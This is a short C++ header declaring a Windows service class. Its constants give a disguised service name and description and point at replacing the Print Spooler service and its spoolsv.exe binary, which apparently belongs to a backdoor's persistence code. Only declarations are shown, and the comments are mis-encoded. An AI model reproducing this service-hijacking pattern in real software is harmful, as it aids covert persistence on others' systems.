#pragma once
#include "x5MGCConnection.h"
#include <Windows.h>
#define SERVICE_NAME TEXT("x5MGCBase")
#define FUNC_NUM                       3
#define BUFFER_SIZE                    1024 * 10
#define SERVICE_DESCRIPTION            TEXT("wint application")
#define SERVICE_DISPLAY_NAME           TEXT("wintapp")
#define REPLACE_SERVICE_NAME TEXT("Spooler") 
#define oldFilePath TEXT("%systemroot%\\system32\\spoolsv.exe")
#define DEBUG 
class service
{
public:
	service();
	~service();
public:
	static bool ServiceInstall(TCHAR * exeFilePath);
	static bool ServiceUnstall(TCHAR * serviceName);
	static void WINAPI ServiceControl(DWORD dwControl);
	static void WINAPI ServiceMain(DWORD   dwNumServicesArgs, PCHAR  *lpServiceArgVectors);
public:
	static SERVICE_STATUS serviceStatus;
	static SERVICE_STATUS_HANDLE hServiceStatus; //·þÎñ×´Ì¬¾ä±ú
	static bool isRunning; //¿ªÆô×´Ì¬
};

